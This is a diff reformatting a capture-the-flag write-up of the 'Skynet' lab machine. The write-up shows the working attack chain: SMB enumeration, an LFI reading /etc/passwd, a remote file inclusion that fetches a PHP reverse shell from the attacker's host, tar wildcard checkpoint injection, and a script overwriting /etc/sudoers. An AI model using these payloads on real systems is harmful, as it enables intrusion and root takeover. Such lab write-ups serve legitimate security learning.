@@ -26,8 +26,7 @@ Time to take on Cyberdyne and there self-aware Skynet.
 
 First step, as usual, is running the nmap to identify the services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.179.35     
 [sudo] password for kali: 
@@ -58,14 +57,13 @@ Network Distance: 4 hops
 Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run the vulnerability category of nmap scripts against the victim.
 
-{% raw %}
-```bash
+{% capture vlnchk %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ sudo nmap --script vuln -oN vulnchk 10.10.179.35         
 [sudo] password for kali: 
@@ -104,14 +102,13 @@ PORT    STATE SERVICE
 |_  /squirrelmail/images/sm_logo.png: SquirrelMail
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=vlnchk %}
 
 <br />
 Use smbclient to list the available shares.
 
-{% raw %}
-```bash
+{% capture smblistshares %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ smbclient -L //10.10.179.35/              
 Password for [WORKGROUP\kali]:
@@ -130,14 +127,13 @@ Reconnecting with SMB1 for workgroup listing.
         Workgroup            Master
         ---------            -------
         WORKGROUP            SKYNET
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=smblistshares %}
 
 <br />
 Connect to the anonymous share and enumerate it.
 
-{% raw %}
-```bash
+{% capture checkanonymousshare %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ smbclient //10.10.179.35/anonymous
 Password for [WORKGROUP\kali]:
@@ -169,28 +165,35 @@ getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0
 smb: \logs\> get log3.txt
 getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
 smb: \logs\> exit
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkanonymousshare %}
 
 <br />
 Cat the attention.txt file to give it a look.
 
-{% raw %}
-```bash
+{% capture catattentiontxt %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
-└─$ cat attention.txt           
+└─$ cat attention.txt   
+{% endcapture %}
+
+{% capture attentiontxt %}
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
 -Miles Dyson
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catattentiontxt %}
+
+{% include codebox.html title="attention.txt" content=attentiontxt %}
 
 <br />
 Cat the log1.txt file to see its contents.  Looks like some kind of password dictionary.
 
-{% raw %}
-```bash
+{% capture catlogtxt %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ cat log1.txt 
+{% endcapture %}
+
+{% capture logtxt %}
 cyborg007haloterminator
 terminator22596
 terminator219
@@ -222,33 +225,34 @@ alonsoterminator
 Walterminator
 79terminator6
 1996terminator
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catlogtxt %}
+
+{% include codebox.html title="log1.txt" content=logtxt %}
 
 <br />
 Check the other two files.  Nothing interesting.
 
-{% raw %}
-```bash
+{% capture catothertwo %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ cat log2.txt 
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ cat log3.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catothertwo %}
 
 <br />
 Attempt to connect to the milesdyson share.
 
-{% raw %}
-```bash
+{% capture smbmilesdyson %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ smbclient //10.10.179.35/milesdyson
 Password for [WORKGROUP\kali]:
 tree connect failed: NT_STATUS_ACCESS_DENIED
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=smbmilesdyson %}
 
 <br />
 Check the Landing Page of the website.
@@ -262,10 +266,7 @@ Check the Landing Page of the website.
 <br />
 Check the source code for the landing page.
 
-{% raw %}
-```html
-view-source:http://10.10.179.35/
-
+{% capture landingsource %}
 <!DOCTYPE html>
 <html>
 	<head>
@@ -284,8 +285,8 @@ view-source:http://10.10.179.35/
 		</div>
 	</body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.179.35/' content=landingsource %}
 
 <br />
 Check the squirrelmail directory that was indicated in the vulnchk scan.
@@ -317,8 +318,7 @@ Check the Samba Password reset email.  Note the potential password.  Read the ot
 <br />
 We can now use the password from the email to login to the milesdyson share and enumerate it.
 
-{% raw %}
-```bash
+{% capture enumeratedyson %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ smbclient //10.10.122.133/milesdyson -U milesdyson
 Password for [WORKGROUP\milesdyson]:
@@ -390,22 +390,26 @@ smb: \notes\> ls
 smb: \notes\> get important.txt
 getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 1276.6 KiloBytes/sec)
 smb: \notes\> exit
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=enumeratedyson %}
 
 <br />
 Let's check the important.txt file that we just...borrowed.
 
-{% raw %}
-```bash
+{% capture catimportant %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ cat important.txt 
+{% endcapture %}
 
+{% capture importanttxt %}
 1. Add features to beta CMS /45kra24zxs28v3yd
 2. Work on T-800 Model 101 blueprints
 3. Spend more time with my wife
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catimportant %}
+
+{% include codebox.html title="Config File Example" content=importanttxt %}
 
 <br />
 Check the folder that is indicated in the file.
@@ -419,10 +423,7 @@ Check the folder that is indicated in the file.
 <br />
 Check the source code for the cms.
 
-{% raw %}
-```html
-view-source:http://10.10.122.133/45kra24zxs28v3yd/
-
+{% capture cmslandingpage %}
 <html>
 <head>
 <style>
@@ -438,8 +439,8 @@ body {
 </center>
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.122.133/45kra24zxs28v3yd/' content=cmslandingpage %}
 
 <br />
 Ffuf the new CMS directory.  Unfortunately, I didn't save this output.  Check the administrator directory that was indicated in the results.  Notice the Cuppa installation.
@@ -463,11 +464,11 @@ Search Exploit-DB for the cuppa,
 <br />
 Fidgit with the payload to get it to work with our specific set-up.
 
-{% raw %}
-```bash
+{% capture lfiurl %}
 http://10.10.122.133/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lfiurl %}
+
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid path="assets/img/skynet/etcpasswd.png" title="/etc/passwd" class="img-fluid rounded z-depth-1" %}
@@ -477,8 +478,7 @@ http://10.10.122.133/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?
 <br />
 Download the Pentest Monkey PHP Reverse Shell.
 
-{% raw %}
-```bash
+{% capture downloadmonkey %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php --inet4-only
 --2025-02-26 22:17:09--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -496,26 +496,24 @@ shell.php                                                  100%[================
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadmonkey %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ sudo nc -nlvp 443                                 
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Update the Monkey script with the proper IP and Port.
 
-{% raw %}
-```php
+{% capture shellphp %}
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 //
@@ -538,24 +536,22 @@ $daemon = 0;
 $debug = 0;
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='shell.php' content=shellphp %}
 
 <br />
 If you don't have a webserver serving the shell.php, start one.  Use the Remote File Inclusion vulnerability from earlier to pull the shell.php.
 
-{% raw %}
-```bash
+{% capture curlshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ curl 'http://10.10.122.133/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.119.29:8000/shell.php
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curlshell %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catch443shell %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
@@ -567,14 +563,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 www-data@skynet:/$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catch443shell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 www-data@skynet:/home/milesdyson$ cat user.txt
 cat user.txt
 <redacted>
@@ -592,14 +587,13 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::c6:12ff:fe8d:2789/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Download linpeas.sh.
 
-{% raw %}
-```bash
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh
 --2025-02-26 22:29:40--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh
@@ -617,14 +611,13 @@ Saving to: ‘linpeas.sh’
 linpeas.sh                                                 100%[========================================================================================================================================>] 820.39K  3.21MB/s    in 0.2s    
 
 2025-02-26 22:29:42 (3.21 MB/s) - ‘linpeas.sh’ saved [840082/840082]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Transfer linpeas.sh to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferpeas %}
 www-data@skynet:/dev/shm$ wget http://10.4.119.29:8000/linpeas.sh
 wget http://10.4.119.29:8000/linpeas.sh
 --2025-02-26 05:30:34--  http://10.4.119.29:8000/linpeas.sh
@@ -639,14 +632,13 @@ linpeas.sh          100%[===================>] 820.39K   384KB/s    in 2.1s
 
 www-data@skynet:/dev/shm$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpeas %}
 
 <br />
 Check the backup script.
 
-{% raw %}
-```bash
+{% capture checkbackup %}
 www-data@skynet:/home/milesdyson$ cd backups
 cd backups
 www-data@skynet:/home/milesdyson/backups$ ls
@@ -654,11 +646,17 @@ ls
 backup.sh  backup.tgz
 www-data@skynet:/home/milesdyson/backups$ cat backup.sh
 cat backup.sh
+{% endcapture %}
+
+{% capture backupsh %}
 #!/bin/bash
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=checkbackup %}
+
+{% include codebox.html title="backup.sh" content=backupsh %}
 
 <br />
 Check for vulnerabilities associated with using a wildcard with tar.
@@ -673,8 +671,7 @@ Check for vulnerabilities associated with using a wildcard with tar.
 <br />
 Check the crontab to ensure that the backup script gets executed.
 
-{% raw %}
-```bash
+{% capture checkcrontab %}
 www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -692,39 +689,42 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkcrontab %}
 
 <br />
 From the article, we know that the way Linux handles wildcards, we can name files with tar options and it will act as command injection.  From the available options, we can use checkpoint with checkpoint-action to exec a bash shell.  So, let's create two files invoking checkpoint.
 
-{% raw %}
-```bash
+{% capture commandinject %}
 www-data@skynet:/home/milesdyson/backups$ cd /var/www/html
 cd /var/www/html
 www-data@skynet:/var/www/html$ echo "" > '--checkpoint=1'
 echo "" > '--checkpoint=1'
 www-data@skynet:/var/www/html$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
 <ml$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=commandinject %}
 
 <br />
 On the attack machine, create a privesc.sh file.  This file will add our user to the sudoers file.
 
-{% raw %}
-```bash
+{% capture createprivesc %}
 ┌──(kali㉿kali)-[~/Documents/thm/skynet]
 └─$ cat privesc.sh                                                                                                                    
 echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=createprivesc %}
+
+{% raw %}
+```bash
+
 ```
 {% endraw %}
 
 <br />
 Transfer it to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferprivesc %}
 www-data@skynet:/var/www/html$ wget http://10.4.119.29:8000/privesc.sh                
 wget http://10.4.119.29:8000/privesc.sh
 --2025-02-26 05:51:36--  http://10.4.119.29:8000/privesc.sh
@@ -744,37 +744,34 @@ ls
 45kra24zxs28v3yd                        config  index.html  style.css
 www-data@skynet:/var/www/html$ chmod +x privesc.sh
 chmod +x privesc.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferprivesc %}
 
 <br />
 Wait for the backup.sh script to run.  Run sudo -l to check when it runs.
 
-{% raw %}
-```bash
+{% capture sudol %}
 www-data@skynet:/var/www/html$ sudo -l
 sudo -l
 User www-data may run the following commands on skynet:
     (root) NOPASSWD: ALL
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Switch into the root account.
 
-{% raw %}
-```bash
+{% capture suroot %}
 www-data@skynet:/var/www/html$ sudo su
 sudo su
 root@skynet:/var/www/html#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=suroot %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@skynet:/var/www/html# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -792,8 +789,8 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::c6:12ff:fe8d:2789/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Hasta la vista, baby.  We wrapped up another one.  Catch you on the flip side, dude.
